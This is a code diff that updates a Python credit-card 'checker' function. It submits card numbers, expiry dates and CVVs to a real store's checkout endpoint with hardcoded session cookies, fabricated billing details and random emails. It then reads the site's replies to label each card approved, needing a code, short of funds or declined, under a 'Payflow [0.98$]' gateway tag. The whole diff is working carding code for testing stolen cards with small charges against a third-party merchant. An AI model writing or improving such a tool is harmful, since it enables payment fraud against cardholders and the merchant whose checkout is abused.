@@ -25,10 +25,52 @@ def process_pf_card(cc):
         if len(yy) == 2:
             yy = "20" + yy
 
+        def generate_random_email():
+            """Generate a random email address"""
+            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+            domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
+            return f"{username}@{domain}"
+
+        def extract_error_message(response_text):
+            """Extract error message from HTML response"""
+            error_patterns = [
+                r'<div class="ERRORS">(.*?)</div>',
+                r'<div class="error">(.*?)</div>',
+                r'<div class="alert alert-error">(.*?)</div>',
+                r'class="error_message">(.*?)<',
+                r'Error:(.*?)<',
+                r'<p class="error">(.*?)</p>',
+                r'<span class="error">(.*?)</span>'
+            ]
+            
+            for pattern in error_patterns:
+                match = re.search(pattern, response_text, re.IGNORECASE | re.DOTALL)
+                if match:
+                    error_text = match.group(1).strip()
+                    # Clean up HTML tags
+                    error_text = re.sub(r'<[^>]*>', '', error_text)
+                    return error_text
+            
+            # Check for success patterns
+            success_patterns = [
+                r'thank you',
+                r'success',
+                r'approved',
+                r'payment complete',
+                r'order confirmed'
+            ]
+            
+            for pattern in success_patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return "Payment Approved"
+            
+            return "No specific message found"
+
         # Common cookies and headers
         cookies = {
-            'PHPSESSID': 'fvu5gfnknkqji49n4jdlimv1f7',
-            'bid_48b113f42dc09a04ef102654144bd0f3': '84deb6a2a19a3574b34723efcf6bf817',
+            "bid_48b113f42dc09a04ef102654144bd0f3": "84deb6a2a19a3574b34723efcf6bf817",
+            "PHPSESSID": "92os74jahvh61pani4ri6i7j76",
+            "cid_48b113f42dc09a04ef102654144bd0f3": "YoIFCQCEA2SASNgbAAka6w%3D%3D__5B0E6P48J8__6B5A2M8N5Z8E1B0N0C4N0Q4L0Q94G9",
         }
         
         headers = {
@@ -47,38 +89,12 @@ def process_pf_card(cc):
             'sec-ch-ua-platform': '"Windows"',
         }
         
-        def generate_random_email():
-            """Generate a random email address"""
-            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
-            domain = random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
-            return f"{username}@{domain}"
-        
-        def extract_error_message(response_text):
-            """Extract error message from HTML response"""
-            error_pattern = r'<div class="ERRORS">(.*?)</div>'
-            match = re.search(error_pattern, response_text)
-            if match:
-                return match.group(1).strip()
-            else:
-                # Try alternative error patterns
-                alt_patterns = [
-                    r'<div class="error">(.*?)</div>',
-                    r'<div class="alert alert-error">(.*?)</div>',
-                    r'class="error_message">(.*?)<',
-                    r'Error:(.*?)<'
-                ]
-                for pattern in alt_patterns:
-                    match = re.search(pattern, response_text, re.IGNORECASE)
-                    if match:
-                        return match.group(1).strip()
-                return "No specific error message found"
-
         # Generate random email
         random_email = generate_random_email()
         
-        # Prepare POST data
-        headers5 = headers.copy()
-        headers5.update({
+        # Prepare POST data for checkout
+        checkout_headers = headers.copy()
+        checkout_headers.update({
             'Cache-Control': 'max-age=0',
             'Content-Type': 'application/x-www-form-urlencoded',
             'Origin': 'https://stores.modularmarket.com',
@@ -86,75 +102,95 @@ def process_pf_card(cc):
         })
         
         data = {
-            'coupon_codes': '',
-            'reward_points': '',
-            'bill_first_name': 'dark',
-            'bill_last_name': 'boy',
-            'bill_address_1': 'New York',
+            # Shipping info
+            'ship_sai[289]': '289',
+            'ship_first_name[289]': 'John',
+            'ship_last_name[289]': 'Doe',
+            'ship_address_1[289]': '123 Main St',
+            'ship_address_2[289]': '',
+            'ship_city[289]': 'New York',
+            'ship_state[289]': 'NY_US',
+            'ship_zip[289]': '10001',
+            'ship_country[289]': 'US',
+            'submit_shipping_options[289_0o0_32]': '1756365496',
+            'ship_method_selection[289_0o0]': 'shipoption_289_0o0_32_6',
+            'submit_shipping_options[289_0o0_36]': '1756365496',
+            'prechecked_ship_methods': 'shipoption_289_0o0_32_6',
+
+            # Billing info
+            'bill_first_name': 'John',
+            'bill_last_name': 'Doe',
+            'bill_address_1': '123 Main St',
             'bill_address_2': '',
             'bill_city': 'New York',
             'bill_state': 'NY_US',
-            'bill_zip': '10200',
+            'bill_zip': '10001',
             'bill_country': 'US',
-            'phone': '9685698569',
+            'phone': '5551234567',
             'email': random_email,
             'email_confirm': random_email,
-            'password': 'Darkboy336',
-            'password_confirm': 'Darkboy336',
-            'slot_2': 'Darkboy',
+
+            # Payment info
+            'slot_2': 'John Doe',
             'slot_1': card_number,
             'slot_3': mm,
             'slot_4': yy,
             'cc_security': cvv,
             'submit_pay_with_cc': 'Pay With Credit Card',
-            'submit_paypal_wps_capture_order_checksum': 'ac1dd209cbcc5e5d1c6e28598e8cbbe8',
+            'submit_paypal_wps_capture_order_checksum': '555d6702c950ecb729a966504af0a635',
             'nectar_decanter': '',
         }
         
-        # Make the request
+        # Make the POST request to checkout
         response = requests.post(
             'https://stores.modularmarket.com/music_for_every_soul/checkout.php',
             cookies=cookies,
-            headers=headers5,
+            headers=checkout_headers,
             data=data,
             timeout=30
         )
         
         if response.status_code == 200:
             error_message = extract_error_message(response.text)
-            
-            # Determine status based on response
             response_lower = response.text.lower()
             error_lower = error_message.lower()
             
-            if 'thank you' in response_lower or 'success' in response_lower or 'approved' in response_lower:
+            # Determine status based on response content
+            if any(pattern in response_lower for pattern in ['thank you', 'success', 'approved', 'payment complete', 'order confirmed' , 'successful' , 'successfully']):
                 return {
                     "status": "APPROVED",
-                    "response": "Payment Approved",
+                    "response": "Payment Successfully",
                     "gateway": "Payflow [0.98$]"
                 }
-            elif 'cvv' in error_lower or 'security code' in error_lower:
+            elif any(pattern in error_lower for pattern in ['cvv', 'security code', 'verification']):
                 return {
                     "status": "APPROVED_OTP",
                     "response": "CVV Required/OTP",
                     "gateway": "Payflow [0.98$]"
                 }
-            elif 'insufficient' in error_lower or 'funds' in error_lower:
+            elif any(pattern in error_lower for pattern in ['insufficient', 'funds', 'low balance']):
                 return {
                     "status": "APPROVED",
                     "response": "Insufficient Funds",
                     "gateway": "Payflow [0.98$]"
                 }
-            elif 'declined' in error_lower or 'cannot be processed' in error_lower:
+            elif any(pattern in error_lower for pattern in ['declined', 'cannot be processed', 'invalid', 'failed']):
                 return {
                     "status": "DECLINED",
-                    "response": error_message[:100] if error_message else "Payment Declined",
+                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Payment Declined",
+                    "gateway": "Payflow [0.98$]"
+                }
+            elif 'do not honor' in error_lower:
+                return {
+                    "status": "DECLINED",
+                    "response": "Do Not Honor",
                     "gateway": "Payflow [0.98$]"
                 }
             else:
+                # Default to declined if we can't determine the status
                 return {
                     "status": "DECLINED",
-                    "response": error_message[:100] if error_message else "Unknown response",
+                    "response": error_message[:120] if error_message and error_message != "No specific message found" else "Unknown response from gateway",
                     "gateway": "Payflow [0.98$]"
                 }
         else:
@@ -167,13 +203,13 @@ def process_pf_card(cc):
     except requests.Timeout:
         return {
             "status": "ERROR",
-            "response": "Request timeout",
+            "response": "Request timeout - Gateway not responding",
             "gateway": "Payflow [0.98$]"
         }
     except requests.ConnectionError:
         return {
             "status": "ERROR",
-            "response": "Connection error",
+            "response": "Connection error - Check your internet",
             "gateway": "Payflow [0.98$]"
         }
     except Exception as e:
@@ -182,3 +218,4 @@ def process_pf_card(cc):
             "response": f"Processing error: {str(e)}",
             "gateway": "Payflow [0.98$]"
         }
+
